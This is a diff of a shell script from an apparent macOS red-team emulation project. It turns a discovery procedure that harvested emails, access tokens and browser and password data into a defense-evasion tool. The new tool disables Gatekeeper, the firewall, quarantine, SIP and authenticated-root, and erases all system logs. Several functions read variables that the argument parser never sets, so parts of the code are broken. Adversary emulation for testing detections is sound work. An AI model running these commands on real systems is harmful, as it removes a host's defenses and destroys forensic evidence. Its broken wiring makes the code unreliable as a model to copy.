@@ -1,14 +1,14 @@
 #!/bin/sh
 # POSIX-compliant
-# Procedure Name: find_account_defaults
-# Tactic: Discovery
-# Technique: T1087.001
-# GUID: 2488a056-5b6d-4a3a-b9d2-782019190eb8
-# Intent: Find account information and user data using defaults read commands to search application preferences and system settings
+# Procedure Name: modify_security_settings
+# Tactic: Defense Evasion
+# Technique: T1562.001
+# GUID: 562bfb9d-a679-4384-b5ca-61151e284a55
+# Intent: Modify macOS security settings including Gatekeeper, firewall, SIP, login items, and system logs
 # Author: @darmado | https://x.com/darmad0
-# created: 2025-01-27
+# created: 2025-01-02
 # Updated: 2025-06-03
-# Version: 1.0.2
+# Version: 1.0.1
 # License: Apache 2.0
 
 # Core function Info:
@@ -19,8 +19,8 @@
 #------------------------------------------------------------------------------
 NAME="" 
 # MITRE ATT&CK Mappings
-TACTIC="Discovery" #replace with you coresponding tactic
-TTP_ID="T1087.001" #replace with you coresponding ttp_id
+TACTIC="Defense Evasion" #replace with you coresponding tactic
+TTP_ID="T1562.001" #replace with you coresponding ttp_id
 
 TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
 TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
@@ -92,18 +92,62 @@ CMD_WC="wc"
 CMD_CAT="cat"
 CMD_LSOF="lsof"
 
-EMAIL_SEARCH=false
-ACCOUNT_SEARCH=false
-APP_DATA=false
-ALL=false
+INPUT_GATEKEEPER_DEFAULTS=""
+GATEKEEPER_DEFAULTS=false
+INPUT_APPFW_SOCKETFILTER=""
+APPFW_SOCKETFILTER=false
+INPUT_APPFW_DEFAULTS=""
+APPFW_DEFAULTS=false
+INPUT_GATEKEEPER_SPCTL=""
+GATEKEEPER_SPCTL=false
+RESTORE_DEFAULTS=false
+SHOW_FW_SETTINGS=false
+INPUT_SET_BLOCKALL=""
+SET_BLOCKALL=false
+INPUT_SET_STEALTHMODE=""
+SET_STEALTHMODE=false
+INPUT_SET_LOGGINGMODE=""
+SET_LOGGINGMODE=false
+INPUT_BLOCK_APP=""
+BLOCK_APP=false
+INPUT_UNBLOCK_APP=""
+UNBLOCK_APP=false
+INPUT_REMOVE_APP=""
+REMOVE_APP=false
+DISABLE_SIP=false
+DISABLE_AUTHENTICATED_ROOT=false
+RESET_LOGIN_ITEMS=false
+ERASE_LOGS=false
+SHOW_SIP_STATUS=false
+DISABLE_QUARANTINE=false
 
+FILE_GATEKEEPER_PREF="/Library/Preferences/com.apple.security"
+KEY_GATEKEEPER="GKAutoRearm"
+FILE_ALF_PREF="/Library/Preferences/com.apple.alf"
+KEY_ALF_GLOBALSTATE="globalstate"
+CMD_SOCKETFILTERFW="/usr/libexec/ApplicationFirewall/socketfilterfw"
 CMD_DEFAULTS="defaults"
+CMD_SPCTL="spctl"
+CMD_SUDO="sudo"
+INPUT_GATEKEEPER=""
+INPUT_APPFW=""
+INPUT_APPFW_DEFAULTS=""
+INPUT_GATEKEEPER_ENFORCEMENT=""
+INPUT_SETBLOCKALL=""
+INPUT_SETSTEALTHMODE=""
+INPUT_SETLOGGINGMODE=""
+INPUT_BLOCKAPP=""
+INPUT_UNBLOCKAPP=""
+INPUT_REMOVE=""
+CMD_CSRUTIL="/usr/bin/csrutil"
+CMD_SFLTOOL="/usr/bin/sfltool"
+CMD_LOG="/usr/bin/log"
 
 # Project root path (set by build system)
 PROJECT_ROOT="/Users/darmado/tools/opensource/attack-macOS"  # Set by build system to project root directory
 
 # Procedure Information (set by build system)
-PROCEDURE_NAME="find_account_defaults"  # Set by build system from YAML procedure_name field
+PROCEDURE_NAME="modify_security_settings"  # Set by build system from YAML procedure_name field
 
 # Function execution tracking
 FUNCTION_LANG=""  # Ued by log_output at execution time
@@ -607,17 +651,139 @@ core_parse_args() {
                 DEBUG=true
                 ;;
 # We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
-        --email-search)
-            EMAIL_SEARCH=true
+        --gatekeeper-defaults)
+            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
+                MISSING_VALUES="$MISSING_VALUES $1"
+            elif [ -n "$2" ]; then
+                INPUT_GATEKEEPER_DEFAULTS="$2"
+                GATEKEEPER_DEFAULTS=true
+                    shift
+            else
+                MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
+        --appfw-socketfilter)
+            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
+                MISSING_VALUES="$MISSING_VALUES $1"
+            elif [ -n "$2" ]; then
+                INPUT_APPFW_SOCKETFILTER="$2"
+                APPFW_SOCKETFILTER=true
+                    shift
+            else
+                MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
+        --appfw-defaults)
+            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
+                MISSING_VALUES="$MISSING_VALUES $1"
+            elif [ -n "$2" ]; then
+                INPUT_APPFW_DEFAULTS="$2"
+                APPFW_DEFAULTS=true
+                    shift
+            else
+                MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
+        --gatekeeper-spctl)
+            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
+                MISSING_VALUES="$MISSING_VALUES $1"
+            elif [ -n "$2" ]; then
+                INPUT_GATEKEEPER_SPCTL="$2"
+                GATEKEEPER_SPCTL=true
+                    shift
+            else
+                MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
+        --restore-defaults)
+            RESTORE_DEFAULTS=true
             ;;
-        --account-search)
-            ACCOUNT_SEARCH=true
+        --show-fw-settings)
+            SHOW_FW_SETTINGS=true
             ;;
-        --app-data)
-            APP_DATA=true
+        --set-blockall)
+            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
+                MISSING_VALUES="$MISSING_VALUES $1"
+            elif [ -n "$2" ]; then
+                INPUT_SET_BLOCKALL="$2"
+                SET_BLOCKALL=true
+                    shift
+            else
+                MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
+        --set-stealthmode)
+            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
+                MISSING_VALUES="$MISSING_VALUES $1"
+            elif [ -n "$2" ]; then
+                INPUT_SET_STEALTHMODE="$2"
+                SET_STEALTHMODE=true
+                    shift
+            else
+                MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
+        --set-loggingmode)
+            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
+                MISSING_VALUES="$MISSING_VALUES $1"
+            elif [ -n "$2" ]; then
+                INPUT_SET_LOGGINGMODE="$2"
+                SET_LOGGINGMODE=true
+                    shift
+            else
+                MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
+        --block-app)
+            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
+                MISSING_VALUES="$MISSING_VALUES $1"
+            elif [ -n "$2" ]; then
+                INPUT_BLOCK_APP="$2"
+                BLOCK_APP=true
+                    shift
+            else
+                MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
+        --unblock-app)
+            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
+                MISSING_VALUES="$MISSING_VALUES $1"
+            elif [ -n "$2" ]; then
+                INPUT_UNBLOCK_APP="$2"
+                UNBLOCK_APP=true
+                    shift
+            else
+                MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
+        --remove-app)
+            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
+                MISSING_VALUES="$MISSING_VALUES $1"
+            elif [ -n "$2" ]; then
+                INPUT_REMOVE_APP="$2"
+                REMOVE_APP=true
+                    shift
+            else
+                MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
+        --disable-sip)
+            DISABLE_SIP=true
             ;;
-        --all)
-            ALL=true
+        --disable-authenticated-root)
+            DISABLE_AUTHENTICATED_ROOT=true
+            ;;
+        --reset-login-items)
+            RESET_LOGIN_ITEMS=true
+            ;;
+        --erase-logs)
+            ERASE_LOGS=true
+            ;;
+        --show-sip-status)
+            SHOW_SIP_STATUS=true
+            ;;
+        --disable-quarantine)
+            DISABLE_QUARANTINE=true
             ;;
             *)
                 # Collect unknown arguments for error reporting
@@ -657,10 +823,24 @@ HELP:
   -d, --debug                   Enable debug output (includes verbose output)
 
 SCRIPT:
-  --email-search                   Search for email addresses in defaults
-  --account-search                 Search for user accounts and device IDs
-  --app-data                       Search application preferences for user data
-  --all                            Run all account discovery searches
+  --gatekeeper-defaults ENABLE|DISABLE Enable or disable Gatekeeper auto-rearm functionality
+  --appfw-socketfilter ENABLE|DISABLE Enable or disable application firewall globally
+  --appfw-defaults ENABLE|DISABLE  Enable or disable ALF (Application Layer Firewall) through preferences
+  --gatekeeper-spctl ENABLE|DISABLE Enable or disable security assessment policy subsystem entirely
+  --restore-defaults               Restore all security settings to their default enabled state
+  --show-fw-settings               Display firewall settings and configuration
+  --set-blockall ENABLE|DISABLE    Block all incoming connections through the firewall
+  --set-stealthmode ENABLE|DISABLE Enable or disable firewall stealth mode
+  --set-loggingmode ENABLE|DISABLE Enable or disable firewall connection logging
+  --block-app ENABLE|DISABLE       Block specific application from network access
+  --unblock-app ENABLE|DISABLE     Unblock specific application for network access
+  --remove-app ENABLE|DISABLE      Remove application from firewall rules entirely
+  --disable-sip                    Disable System Integrity Protection (requires recovery mode)
+  --disable-authenticated-root     Disable authenticated-root (requires recovery mode)
+  --reset-login-items              Reset all third-party Login Items to installation defaults
+  --erase-logs                     Remove all log messages from the system
+  --show-sip-status                Display current System Integrity Protection status
+  --disable-quarantine             Disable LSQuarantine warnings for downloaded files
 
 Output Options:
   --format TYPE                 
@@ -2004,6 +2184,9 @@ raw_output=""
 # Set global function language for this procedure
 FUNCTION_LANG="shell"
 
+# Process input arguments
+process_input_arguments
+
 # Helper function to execute procedure functions
 execute_function() {
     local func_name="$1"
@@ -2011,40 +2194,134 @@ execute_function() {
     $func_name
 }
 
-# Execute functions for --email-search
-if [ "$EMAIL_SEARCH" = true ]; then
-    core_debug_print "Executing functions for --email-search"
-    result=$(execute_function find_email_addresses)
+# Execute functions for --gatekeeper-defaults
+if [ "$GATEKEEPER_DEFAULTS" = true ]; then
+    core_debug_print "Executing functions for --gatekeeper-defaults"
+    result=$(execute_function gatekeeper_defaults)
     raw_output="${raw_output}${result}"
 fi
 
-# Execute functions for --account-search
-if [ "$ACCOUNT_SEARCH" = true ]; then
-    core_debug_print "Executing functions for --account-search"
-    result=$(execute_function find_user_accounts)
+# Execute functions for --appfw-socketfilter
+if [ "$APPFW_SOCKETFILTER" = true ]; then
+    core_debug_print "Executing functions for --appfw-socketfilter"
+    result=$(execute_function appfw_socketfilter)
     raw_output="${raw_output}${result}"
 fi
 
-# Execute functions for --app-data
-if [ "$APP_DATA" = true ]; then
-    core_debug_print "Executing functions for --app-data"
-    result=$(execute_function find_app_user_data)
+# Execute functions for --appfw-defaults
+if [ "$APPFW_DEFAULTS" = true ]; then
+    core_debug_print "Executing functions for --appfw-defaults"
+    result=$(execute_function appfw_defaults)
     raw_output="${raw_output}${result}"
 fi
 
-# Execute functions for --all
-if [ "$ALL" = true ]; then
-    core_debug_print "Executing functions for --all"
-    result=$(execute_function find_email_addresses)
+# Execute functions for --gatekeeper-spctl
+if [ "$GATEKEEPER_SPCTL" = true ]; then
+    core_debug_print "Executing functions for --gatekeeper-spctl"
+    result=$(execute_function gatekeeper_spctl)
     raw_output="${raw_output}${result}"
-    result=$(execute_function find_user_accounts)
+fi
+
+# Execute functions for --restore-defaults
+if [ "$RESTORE_DEFAULTS" = true ]; then
+    core_debug_print "Executing functions for --restore-defaults"
+    result=$(execute_function restore_security_defaults)
     raw_output="${raw_output}${result}"
-    result=$(execute_function find_app_user_data)
+fi
+
+# Execute functions for --show-fw-settings
+if [ "$SHOW_FW_SETTINGS" = true ]; then
+    core_debug_print "Executing functions for --show-fw-settings"
+    result=$(execute_function show_fw_settings)
+    raw_output="${raw_output}${result}"
+fi
+
+# Execute functions for --set-blockall
+if [ "$SET_BLOCKALL" = true ]; then
+    core_debug_print "Executing functions for --set-blockall"
+    result=$(execute_function setblockall_fw)
+    raw_output="${raw_output}${result}"
+fi
+
+# Execute functions for --set-stealthmode
+if [ "$SET_STEALTHMODE" = true ]; then
+    core_debug_print "Executing functions for --set-stealthmode"
+    result=$(execute_function setstealthmode_fw)
+    raw_output="${raw_output}${result}"
+fi
+
+# Execute functions for --set-loggingmode
+if [ "$SET_LOGGINGMODE" = true ]; then
+    core_debug_print "Executing functions for --set-loggingmode"
+    result=$(execute_function setloggingmode_fw)
+    raw_output="${raw_output}${result}"
+fi
+
+# Execute functions for --block-app
+if [ "$BLOCK_APP" = true ]; then
+    core_debug_print "Executing functions for --block-app"
+    result=$(execute_function blockapp_fw)
+    raw_output="${raw_output}${result}"
+fi
+
+# Execute functions for --unblock-app
+if [ "$UNBLOCK_APP" = true ]; then
+    core_debug_print "Executing functions for --unblock-app"
+    result=$(execute_function unblockapp_fw)
+    raw_output="${raw_output}${result}"
+fi
+
+# Execute functions for --remove-app
+if [ "$REMOVE_APP" = true ]; then
+    core_debug_print "Executing functions for --remove-app"
+    result=$(execute_function remove_fw)
+    raw_output="${raw_output}${result}"
+fi
+
+# Execute functions for --disable-sip
+if [ "$DISABLE_SIP" = true ]; then
+    core_debug_print "Executing functions for --disable-sip"
+    result=$(execute_function disable_sip)
+    raw_output="${raw_output}${result}"
+fi
+
+# Execute functions for --disable-authenticated-root
+if [ "$DISABLE_AUTHENTICATED_ROOT" = true ]; then
+    core_debug_print "Executing functions for --disable-authenticated-root"
+    result=$(execute_function disable_authenticated_root)
+    raw_output="${raw_output}${result}"
+fi
+
+# Execute functions for --reset-login-items
+if [ "$RESET_LOGIN_ITEMS" = true ]; then
+    core_debug_print "Executing functions for --reset-login-items"
+    result=$(execute_function reset_login_items)
+    raw_output="${raw_output}${result}"
+fi
+
+# Execute functions for --erase-logs
+if [ "$ERASE_LOGS" = true ]; then
+    core_debug_print "Executing functions for --erase-logs"
+    result=$(execute_function erase_all_logs)
+    raw_output="${raw_output}${result}"
+fi
+
+# Execute functions for --show-sip-status
+if [ "$SHOW_SIP_STATUS" = true ]; then
+    core_debug_print "Executing functions for --show-sip-status"
+    result=$(execute_function show_sip_status)
+    raw_output="${raw_output}${result}"
+fi
+
+# Execute functions for --disable-quarantine
+if [ "$DISABLE_QUARANTINE" = true ]; then
+    core_debug_print "Executing functions for --disable-quarantine"
+    result=$(execute_function disable_quarantine)
     raw_output="${raw_output}${result}"
 fi
 
 # Set procedure name for processing
-procedure="find_account_defaults"
+procedure="modify_security_settings"
         # This section is intentionally left empty as it will be filled by
         # technique-specific implementations when sourcing this base script
         # If no raw_output is set by the script, exit gracefully
@@ -2208,144 +2485,314 @@ core_generate_encryption_key() {
 
 # Generate job ID now that core functions are defined
 
+# Input processing and type conversion
+process_input_arguments() {
+    # Process and validate input arguments based on their types
+    
+    # Process --gatekeeper-defaults argument
+    if [ -n "${INPUT_GATEKEEPER_DEFAULTS}" ]; then
+        # Process string input
+        GATEKEEPER_DEFAULTS_ARG="${INPUT_GATEKEEPER_DEFAULTS}"
+    fi
+    
+    # Process --appfw-socketfilter argument
+    if [ -n "${INPUT_APPFW_SOCKETFILTER}" ]; then
+        # Process string input
+        APPFW_SOCKETFILTER_ARG="${INPUT_APPFW_SOCKETFILTER}"
+    fi
+    
+    # Process --appfw-defaults argument
+    if [ -n "${INPUT_APPFW_DEFAULTS}" ]; then
+        # Process string input
+        APPFW_DEFAULTS_ARG="${INPUT_APPFW_DEFAULTS}"
+    fi
+    
+    # Process --gatekeeper-spctl argument
+    if [ -n "${INPUT_GATEKEEPER_SPCTL}" ]; then
+        # Process string input
+        GATEKEEPER_SPCTL_ARG="${INPUT_GATEKEEPER_SPCTL}"
+    fi
+    
+    # Process --set-blockall argument
+    if [ -n "${INPUT_SET_BLOCKALL}" ]; then
+        # Process string input
+        SET_BLOCKALL_ARG="${INPUT_SET_BLOCKALL}"
+    fi
+    
+    # Process --set-stealthmode argument
+    if [ -n "${INPUT_SET_STEALTHMODE}" ]; then
+        # Process string input
+        SET_STEALTHMODE_ARG="${INPUT_SET_STEALTHMODE}"
+    fi
+    
+    # Process --set-loggingmode argument
+    if [ -n "${INPUT_SET_LOGGINGMODE}" ]; then
+        # Process string input
+        SET_LOGGINGMODE_ARG="${INPUT_SET_LOGGINGMODE}"
+    fi
+    
+    # Process --block-app argument
+    if [ -n "${INPUT_BLOCK_APP}" ]; then
+        # Process string input
+        BLOCK_APP_ARG="${INPUT_BLOCK_APP}"
+    fi
+    
+    # Process --unblock-app argument
+    if [ -n "${INPUT_UNBLOCK_APP}" ]; then
+        # Process string input
+        UNBLOCK_APP_ARG="${INPUT_UNBLOCK_APP}"
+    fi
+    
+    # Process --remove-app argument
+    if [ -n "${INPUT_REMOVE_APP}" ]; then
+        # Process string input
+        REMOVE_APP_ARG="${INPUT_REMOVE_APP}"
+    fi
+}
 
 
-# Function: find_email_addresses
+# Function: gatekeeper_defaults
 # Type: main
 # Languages: shell
 FUNCTION_LANG="shell"
 # Sudo privileges: Not required
 
-find_email_addresses() {
-    $CMD_PRINTF "SEARCH_TYPE|COMMAND|RESULT\n"
-    
-    # Find email addresses
-    local email_result
-    email_result=$($CMD_DEFAULTS find EmailAddress 2>/dev/null)
-    if [ -n "$email_result" ]; then
-        $CMD_PRINTF "EMAIL|defaults find EmailAddress|%s\n" "$email_result"
-    fi
-    
-    # Find owner email addresses
-    local owner_result
-    owner_result=$($CMD_DEFAULTS find OwnerEmailAddress 2>/dev/null)
-    if [ -n "$owner_result" ]; then
-        $CMD_PRINTF "OWNER_EMAIL|defaults find OwnerEmailAddress|%s\n" "$owner_result"
-    fi
-    
-    # Grammarly email data
-    local grammarly_result
-    grammarly_result=$($CMD_DEFAULTS read com.grammarly.ProjectLlama 2>/dev/null)
-    if [ -n "$grammarly_result" ]; then
-        $CMD_PRINTF "GRAMMARLY_DATA|defaults read com.grammarly.ProjectLlama|%s\n" "$grammarly_result"
-    fi
-    
-    return 0
+gatekeeper_defaults() {
+    local output=$("$CMD_SUDO" "$CMD_DEFAULTS" write "$FILE_GATEKEEPER_PREF" "$KEY_GATEKEEPER" -bool "$INPUT_GATEKEEPER" 2>&1)
+    $CMD_PRINTF "GATEKEEPER|%s\n" "$output"
 }
 
 
-# Function: find_user_accounts
+# Function: appfw_socketfilter
 # Type: main
 # Languages: shell
 FUNCTION_LANG="shell"
 # Sudo privileges: Not required
 
-find_user_accounts() {
-    $CMD_PRINTF "SEARCH_TYPE|COMMAND|RESULT\n"
-    
-    # Find user accounts
-    local account_result
-    account_result=$($CMD_DEFAULTS find userAccount 2>/dev/null)
-    if [ -n "$account_result" ]; then
-        $CMD_PRINTF "USER_ACCOUNT|defaults find userAccount|%s\n" "$account_result"
-    fi
-    
-    # Find device identifiers
-    local device_result
-    device_result=$($CMD_DEFAULTS find DeviceIdentifier 2>/dev/null)
-    if [ -n "$device_result" ]; then
-        $CMD_PRINTF "DEVICE_ID|defaults find DeviceIdentifier|%s\n" "$device_result"
-    fi
-    
-    # Find access tokens
-    local token_result
-    token_result=$($CMD_DEFAULTS find access_token 2>/dev/null | sed 's/\\\\//g')
-    if [ -n "$token_result" ]; then
-        $CMD_PRINTF "ACCESS_TOKEN|defaults find access_token|%s\n" "$token_result"
-    fi
-    
-    # JAMF state
-    local jamf_result
-    jamf_result=$($CMD_DEFAULTS read com.jamf.connect.state 2>/dev/null)
-    if [ -n "$jamf_result" ]; then
-        $CMD_PRINTF "JAMF_STATE|defaults read com.jamf.connect.state|%s\n" "$jamf_result"
-    fi
-    
-    return 0
+appfw_socketfilter() {
+    local output=$("$CMD_SUDO" "$CMD_SOCKETFILTERFW" --setglobalstate "$INPUT_APPFW" 2>&1)
+    $CMD_PRINTF "APPFW|%s\n" "$output"
 }
 
 
-# Function: find_app_user_data
+# Function: appfw_defaults
 # Type: main
 # Languages: shell
 FUNCTION_LANG="shell"
 # Sudo privileges: Not required
 
-find_app_user_data() {
-    $CMD_PRINTF "SEARCH_TYPE|COMMAND|RESULT\n"
-    
-    # Safari data
-    local safari_searches
-    safari_searches=$($CMD_DEFAULTS read com.apple.Safari RecentWebSearches 2>/dev/null)
-    if [ -n "$safari_searches" ]; then
-        $CMD_PRINTF "SAFARI_SEARCHES|defaults read com.apple.Safari RecentWebSearches|%s\n" "$safari_searches"
-    fi
-    
-    # Password settings
-    local password_settings
-    password_settings=$($CMD_DEFAULTS read com.apple.Passwords-Settings.extension 2>/dev/null)
-    if [ -n "$password_settings" ]; then
-        $CMD_PRINTF "PASSWORD_SETTINGS|defaults read com.apple.Passwords-Settings.extension|%s\n" "$password_settings"
-    fi
-    
-    # Microsoft To-Do
-    local todo_result
-    todo_result=$($CMD_DEFAULTS read com.microsoft.to-do-mac 2>/dev/null)
-    if [ -n "$todo_result" ]; then
-        $CMD_PRINTF "TODO_DATA|defaults read com.microsoft.to-do-mac|%s\n" "$todo_result"
-    fi
-    
-    # CapCut data
-    local capcut_result
-    capcut_result=$($CMD_DEFAULTS read com.lemon.lvoverseas 2>/dev/null)
-    if [ -n "$capcut_result" ]; then
-        $CMD_PRINTF "CAPCUT_DATA|defaults read com.lemon.lvoverseas|%s\n" "$capcut_result"
-    fi
-    
-    # Google Drive settings
-    local gdrive_result
-    gdrive_result=$($CMD_DEFAULTS read com.google.drivefs.settings 2>/dev/null)
-    if [ -n "$gdrive_result" ]; then
-        $CMD_PRINTF "GDRIVE_SETTINGS|defaults read com.google.drivefs.settings|%s\n" "$gdrive_result"
-    fi
-    
-    # Mail settings
-    local mail_result
-    mail_result=$($CMD_DEFAULTS read com.apple.mail 2>/dev/null)
-    if [ -n "$mail_result" ]; then
-        $CMD_PRINTF "MAIL_SETTINGS|defaults read com.apple.mail|%s\n" "$mail_result"
-    fi
-    
-    # Notification Center preferences
-    local ncprefs_result
-    ncprefs_result=$($CMD_DEFAULTS read com.apple.ncprefs 2>/dev/null)
-    if [ -n "$ncprefs_result" ]; then
-        $CMD_PRINTF "NOTIFICATION_PREFS|defaults read com.apple.ncprefs|%s\n" "$ncprefs_result"
-    fi
-    
-    return 0
+appfw_defaults() {
+    local output=$("$CMD_SUDO" "$CMD_DEFAULTS" write "$FILE_ALF_PREF" "$KEY_ALF_GLOBALSTATE" -int "$INPUT_APPFW_DEFAULTS" 2>&1)
+    $CMD_PRINTF "ALF|%s\n" "$output"
 }
 
+
+# Function: gatekeeper_spctl
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
+gatekeeper_spctl() {
+    local output=$("$CMD_SUDO" "$CMD_SPCTL" --master-"$INPUT_SPCTL" 2>&1)
+    $CMD_PRINTF "SPCTL|%s\n" "$output"
+}
+
+
+# Function: restore_security_defaults
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
+restore_security_defaults() {
+    local output1=$("$CMD_SUDO" "$CMD_DEFAULTS" write "$FILE_GATEKEEPER_PREF" "$KEY_GATEKEEPER" -bool YES 2>&1)
+    local output2=$("$CMD_SUDO" "$CMD_SOCKETFILTERFW" --setglobalstate ON 2>&1)
+    local output3=$("$CMD_SUDO" "$CMD_SPCTL" --master-enable 2>&1)
+    $CMD_PRINTF "RESTORE_DEFAULTS|%s|%s|%s\n" "$output1" "$output2" "$output3"
+}
+
+
+# Function: show_fw_settings
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
+show_fw_settings() {
+    local output1=$("$CMD_DEFAULTS" read "$FILE_GATEKEEPER_PREF" "$KEY_GATEKEEPER" 2>&1)
+    local output2=$("$CMD_SOCKETFILTERFW" --getglobalstate 2>&1)
+    local output3=$("$CMD_SPCTL" --status 2>&1)
+    $CMD_PRINTF "FW_SETTINGS|%s|%s|%s\n" "$output1" "$output2" "$output3"
+}
+
+
+# Function: setblockall_fw
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
+setblockall_fw() {
+    local output=$("$CMD_SUDO" "$CMD_SOCKETFILTERFW" --setblockall "$INPUT_BLOCKALL" 2>&1)
+    $CMD_PRINTF "BLOCKALL|%s\n" "$output"
+}
+
+
+# Function: setstealthmode_fw
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
+setstealthmode_fw() {
+    local output=$("$CMD_SUDO" "$CMD_SOCKETFILTERFW" --setstealthmode "$INPUT_STEALTH" 2>&1)
+    $CMD_PRINTF "STEALTH|%s\n" "$output"
+}
+
+
+# Function: setallowsigned_fw
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
+setallowsigned_fw() {
+    local output=$("$CMD_SUDO" "$CMD_SOCKETFILTERFW" --setallowsigned "$INPUT_ALLOWSIGNED" 2>&1)
+    $CMD_PRINTF "ALLOWSIGNED|%s\n" "$output"
+}
+
+
+# Function: setloggingmode_fw
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
+setloggingmode_fw() {
+    local output=$("$CMD_SUDO" "$CMD_SOCKETFILTERFW" --setloggingmode "$INPUT_LOGGING" 2>&1)
+    $CMD_PRINTF "LOGGING|%s\n" "$output"
+}
+
+
+# Function: blockapp_fw
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
+blockapp_fw() {
+    local output=$("$CMD_SUDO" "$CMD_SOCKETFILTERFW" --blockapp "$INPUT_BLOCKAPP" 2>&1)
+    $CMD_PRINTF "BLOCKAPP|%s\n" "$output"
+}
+
+
+# Function: unblockapp_fw
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
+unblockapp_fw() {
+    local output=$("$CMD_SUDO" "$CMD_SOCKETFILTERFW" --unblockapp "$INPUT_UNBLOCKAPP" 2>&1)
+    $CMD_PRINTF "UNBLOCKAPP|%s\n" "$output"
+}
+
+
+# Function: add_fw
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
+add_fw() {
+    local output=$("$CMD_SUDO" "$CMD_SOCKETFILTERFW" --add "$INPUT_ADD" 2>&1)
+    $CMD_PRINTF "FIREWALL_ADD|%s\n" "$output"
+}
+
+
+# Function: remove_fw
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
+remove_fw() {
+    local output=$("$CMD_SUDO" "$CMD_SOCKETFILTERFW" --remove "$INPUT_REMOVE" 2>&1)
+    $CMD_PRINTF "FIREWALL_REMOVE|%s\n" "$output"
+}
+
+
+# Function: disable_sip
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
+disable_sip() {
+    local output=$("$CMD_CSRUTIL" disable 2>&1)
+    $CMD_PRINTF "SIP_DISABLE|%s\n" "$output"
+}
+
+
+# Function: disable_authenticated_root
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
+disable_authenticated_root() {
+    local output=$("$CMD_CSRUTIL" authenticated-root disable 2>&1)
+    $CMD_PRINTF "AUTHENTICATED_ROOT_DISABLE|%s\n" "$output"
+}
+
+
+# Function: reset_login_items
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
+reset_login_items() {
+    local output=$("$CMD_SFLTOOL" resetbtm 2>&1)
+    $CMD_PRINTF "LOGIN_ITEMS_RESET|%s\n" "$output"
+}
+
+
+# Function: erase_all_logs
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
+erase_all_logs() {
+    local output=$("$CMD_SUDO" "$CMD_LOG" erase --all 2>&1)
+    $CMD_PRINTF "LOGS_ERASED|%s\n" "$output"
+}
+
+
+# Function: show_sip_status
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
+show_sip_status() {
+    local output=$("$CMD_CSRUTIL" status 2>&1)
+    $CMD_PRINTF "SIP_STATUS|%s\n" "$output"
+}
+
+
+# Function: disable_quarantine
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
+disable_quarantine() {
+    local output=$("$CMD_SUDO" "$CMD_DEFAULTS" write com.apple.LaunchServices LSQuarantine -bool NO 2>&1)
+    $CMD_PRINTF "QUARANTINE_DISABLED|%s\n" "$output"
+} 
 
 
 JOB_ID=$(core_generate_job_id)
